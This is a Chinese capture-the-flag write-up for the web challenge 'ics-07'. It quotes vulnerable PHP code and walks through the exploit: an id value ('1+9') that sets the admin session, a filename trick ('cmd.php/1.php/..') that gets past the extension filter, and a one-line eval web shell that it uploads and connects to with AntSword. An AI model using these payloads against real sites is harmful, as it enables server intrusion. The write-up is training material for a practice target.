## D4 T2 ics-07

界面有个view-source给了个源码

看了一下发现有上传点

```php
    <?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
     ?>
```

但是需要拿到admin的session

接着看源码

```php
    <?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
     ?>
```

如果拿到session需要传入的

floatval($_GET[id]) !== '1' (其实强类型比较怎么这里怎么都可。。。。)

并且 substr($_GET[id], -1) === '9'

并且在数据库中要能查到（放在一起）

好像只有一条记录用空格截断就可

```
payload=/index.php?page=flag&id=1+9&submit=提交#
```

然后可以传文件了

```
con=233&file=233.txt
```

但是

```php
preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)//$匹配末尾
```

把.php/php5等一众后缀名过滤了,怎么让传上去的文件能被php解析呢？

对于这种只检测末尾的

我们可以这样绕过

```
con=<?php @eval($_POST['cmd']);?>&file=cmd.php/1.php/..
```

..是上级目录

相当于会上传到/uploaded/backup/

同时绕过了后缀检测

然后就可以用蚁剑连上去了

### 参考资料

解析漏洞：https://www.guildhab.top/?p=481